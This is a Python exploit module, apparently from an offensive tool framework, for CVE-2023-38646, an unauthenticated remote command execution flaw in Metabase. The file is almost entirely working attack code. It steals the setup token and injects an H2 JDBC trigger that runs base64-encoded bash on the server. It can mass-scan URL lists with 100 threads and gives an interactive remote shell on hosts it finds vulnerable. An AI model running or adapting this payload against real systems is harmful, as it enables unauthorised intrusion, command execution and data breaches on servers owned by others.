import re
import os
import json
import base64
import warnings
import requests

from modules.io import *
from core.modular import Module
from urllib.parse import urlparse
from alive_progress import alive_bar
from prompt_toolkit import PromptSession
from prompt_toolkit.formatted_text import HTML
from prompt_toolkit.history import InMemoryHistory
from concurrent.futures import ThreadPoolExecutor, as_completed
from requests.packages.urllib3.exceptions import InsecureRequestWarning


class Exploit(Module):
    """
    Metabase Remote Command Execution Vulnerability

    Description:
    Metabase versions before 0.46.6.1 (Open Source) and 1.46.6.1 (Enterprise) have been found to contain a remote command execution vulnerability. This vulnerability allows attackers to execute arbitrary commands on the Metabase server at the server's privilege level. Authentication is not required for exploitation.

    Impact:
    An attacker can exploit this vulnerability by sending specially crafted requests to the affected Metabase server. Successful exploitation of the vulnerability allows the attacker to execute arbitrary commands on the server, potentially leading to unauthorized access, data breaches, or further compromise of the server.

    Affected Versions:
    - Metabase versions before 0.46.6.1 (Open Source)
    - Metabase versions before 1.46.6.1 (Enterprise)

    Patched Versions:
    - Metabase version 0.46.6.1 (Open Source)
    - Metabase version 1.46.6.1 (Enterprise)
    - Metabase version 0.45.4.1 (Open Source)
    - Metabase version 1.45.4.1 (Enterprise)
    - Metabase version 0.44.7.1 (Open Source)
    - Metabase version 1.44.7.1 (Enterprise)
    - Metabase version 0.43.7.2 (Open Source)
    - Metabase version 1.43.7.2 (Enterprise)
    """

    def __init__(self):
        """
        Initializes the exploit module for Metabase RCE with default settings.
        Sets the CVE ID, a brief description, author information, creation date,
        and initializes various control variables used in the exploit.
        """

        self.name = "CVE-2023-38646"
        self.description = (
            "RCE in Metabase 0.46.6.1 (Open Source), 1.46.6.1 (Enterprise)."
        )
        self.author = "Chocapikk"
        self.creation_date = "18-11-2023"

        self.url = None
        self.verbose = False
        self.output = None
        self.threads = 100

    def execute(self):
        """
        Executes the exploit process for Metabase RCE. This includes setting up the environment,
        configuring options based on user input, and then proceeding with the actual exploit attempt,
        either on a single URL or a list of URLs.
        """

        warnings.simplefilter("ignore", InsecureRequestWarning)
        mode = input_data(self.name, "Choose mode (url/list)")

        if mode.lower() == "url":
            self.url = input_data(self.name, "Enter the base URL for the requests")

            verbose_input = input_data(self.name, "Enable verbose output? (yes/no)")
            self.verbose = verbose_input.lower() == "yes"

            output_file = input_data(self.name, "Enter the output file path")
            self.output = output_file.strip() if output_file else None

            self.check_url(self.url, self.verbose, self.output, single_url_mode=True)

        elif mode.lower() == "list":
            file_path = input_data(
                self.name, "Enter the file path containing a list of base URLs to scan"
            )

            try:
                with open(file_path, "r") as file:
                    urls = [line.strip() for line in file]
            except (OSError, FileNotFoundError) as e:
                print_error(f"Error opening URL file: {e}.")
                return

            output_file = input_data(self.name, "Enter the output file path")
            self.output = output_file.strip() if output_file else None

            with ThreadPoolExecutor(max_workers=self.threads) as executor, alive_bar(
                len(urls), bar="smooth", enrich_print=False
            ) as bar:
                futures = {
                    executor.submit(self.check_url, url, self.verbose, self.output): url
                    for url in urls
                }
                for future in as_completed(futures):
                    bar()

        else:
            print_error("Invalid mode selected. Please choose 'url' or 'list'.")

    def get_token_from_api(self, base_url):
        """
        Fetches a setup token from the Metabase API. This token is used in the exploit process.

        :param base_url: The base URL of the Metabase instance.
        :return: The retrieved setup token.
        """

        url = base_url + "/api/session/properties"
        response = requests.get(url, verify=False, timeout=3)
        data = json.loads(response.text)
        token = data.get("setup-token")
        return token

    def send_request(self, base_url, token, command="uname -a"):
        """
        Sends an RCE payload to the Metabase instance. Crafts the payload based on the command provided.

        :param base_url: The base URL of the Metabase instance.
        :param token: The setup token for the Metabase instance.
        :param command: The command to execute on the server.
        :return: The response from the server after sending the RCE payload.
        """

        command = f"(echo '[S]';{command};echo '[E]') > /tmp/lol"
        encoded_command = (
            base64.b64encode(f"$( {command} )".encode()).decode().replace("=", "%3D")
        )
        payload = {
            "token": token,
            "details": {
                "details": {
                    "db": "zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1\\;CREATE TRIGGER test BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec('bash -c {echo,"
                    + encoded_command
                    + "}|{base64,-d}|{bash,-i}')\n$$--=x",
                    "advanced-options": False,
                },
                "engine": "h2",
            },
        }
        parsed_url = urlparse(base_url)
        headers = {
            "Host": parsed_url.netloc,
            "Accept": "application/json",
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 ",
            "Connection": "close",
        }
        response = requests.post(
            f"{base_url}/api/setup/validate", headers=headers, data=json.dumps(payload)
        )

        json_data = {
            "token": token,
            "details": {
                "details": {
                    "subprotocol": "h2",
                    "classname": "org.h2.Driver",
                    "advanced-options": True,
                    "subname": "mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM '/tmp/lol'//\\;",
                },
                "name": "1337_h4x0r",
                "engine": "postgres",
            },
        }

        url = f"{base_url}/api/setup/validate"
        response = requests.post(
            url, headers=headers, json=json_data, verify=False, timeout=3
        )
        return response

    def check_vulnerability(
        self, url, response, verbose, output_file=None, single_url_mode=False
    ):
        """
        Checks if the response from the server indicates a successful RCE exploitation.

        :param url: The URL of the Metabase instance.
        :param response: The response from the server to the RCE payload.
        :param verbose: Flag to enable verbose output.
        :param output_file: Path to the output file, if any.
        :param single_url_mode: Flag to indicate if the function is operating in single URL mode.
        :return: True if the vulnerability is present, False otherwise.
        """

        match = re.search(r"\[S\](.*?)\[E\]", response.text)
        if match:
            pattern = re.compile(r"\[S\](.*?)\[E\]", re.DOTALL)
            response_content = pattern.search(response.text)
            print_success(f"{url} is vulnerable.") if not single_url_mode else None
            if output_file and not single_url_mode:
                with open(output_file, "a") as file:
                    file.write(url + "\n")
            if verbose or single_url_mode:
                truncated_content = (
                    response_content.group(1)
                    .replace("\\000a", "\n")
                    .replace("\\n", "\n")
                )
                print_status(f"\n{truncated_content}")
            return True

    def check_url(self, url, verbose, output_file, single_url_mode=False):
        """
        Wrapper function that checks a single URL for the Metabase RCE vulnerability.
        This includes token retrieval, sending the RCE request, and checking the response.

        :param url: The URL to check for vulnerability.
        :param verbose: Flag to enable verbose output.
        :param output_file: Path to the output file, if any.
        :param single_url_mode: Flag to indicate if the function is operating in single URL mode.
        """

        token = self.get_token_from_api(url)
        response = self.send_request(url, token)
        if self.check_vulnerability(url, response, verbose, output_file):
            if single_url_mode:
                session = PromptSession(history=InMemoryHistory())
                while True:
                    try:
                        command = session.prompt(HTML("<ansired><b># </b></ansired>"))
                        if "exit" in command:
                            raise KeyboardInterrupt
                        elif not command:
                            continue
                        elif "clear" in command:
                            if os.name == "posix":
                                os.system("clear")
                            elif os.name == "nt":
                                os.system("cls")
                            if command.lower() in ["exit", "quit"]:
                                break
                        response = self.send_request(url, token, command)
                        self.check_vulnerability(
                            url, response, verbose, output_file, single_url_mode=True
                        )
                    except KeyboardInterrupt:
                        print_info("Exiting shell...")
                        return None
